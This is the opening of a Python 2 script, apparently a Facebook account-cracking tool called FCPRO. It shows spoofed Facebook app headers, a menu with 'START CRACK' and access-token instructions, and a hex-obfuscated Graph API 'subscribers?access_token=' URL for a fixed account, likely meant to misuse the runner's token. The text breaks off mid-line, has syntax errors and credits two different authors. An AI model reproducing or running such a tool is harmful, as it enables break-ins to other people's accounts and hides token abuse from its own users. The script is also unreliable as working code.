#!/usr/bin/python2

# -*- coding: utf-8

#AUTHOR : AZIM VAU (MR. ERROR)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO MR. ERROR

try:

	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess	from multiprocessing.pool import ThreadPool

	from requests.exceptions import ConnectionError

except ImportError:

	os.system("pip2 install requests lolcat")

	os.system("python2 fcpro.py")

from os import system

from time import sleep

def xox(z):

    for e in z + "\n":

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.04)

      

				

user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])

header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

try:

	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')

	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')

except requests.exceptions.ConnectionError:

	os.system("clear")

	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")

	sys.exit()

	

ip = requests.get('https://api.ipify.org').text.strip()

loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()

	

def linex():

	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')

def logo():

	os.system('echo "\n  ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n  ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n  ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n  ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██\n   ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n   ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { FCPRO }        ║\n    ║ AUTHOR   : ADNAN WASIF SHAKIL       ║\n    ║ GITHUB   : ADNAN-143   ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():

	os.system("clear")

	logo()

	print("\t\033[93;1m      MAIN MENU\x1b[0m")

	print("")

	print("\033[92;1m  [1] START CRACK")

	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")

	print("\033[94;1m  [3] UPDATE TOOL")

	print("\033[96;1m  [J] JOIN MR. ERROR GROUP \033[92;1m✘\033[91;1m✘")

	print("\033[90;1m  [0] EXIT")

	print("")

	log_sel()

	

def log_sel():

	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")

	if sel == "":

		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")

		log_sel()

	elif sel =="1" or sel =="01":

		token()

	elif sel =="2" or sel =="02":

		subprocess.check_output(["am", "start", "https://www.facebook.com/114133313700086/posts/426873429092738"])

		main()

	elif sel =="3" or sel =="03":

		import os

		try:

			os.system("https://www.facebook.com/jonising.com12")

			os.system("rm -rf fcpro.py")

			os.system("cp -f fcpro/fcpro.py \\.")

			os.system("rm -rf fcpro")

			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")

			time.sleep(2)

			main()

		except KeyboardInterrupt:

			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")

	        	main()

	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":

		subprocess.check_output(["am", "start", "https://t.me/mrerrorgroup"])

		main()

	elif sel =="0" or sel =="00":

		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")

		sys.exit()

	else:

		print("")

		print("\t\033[91;1m  SELECT VAL
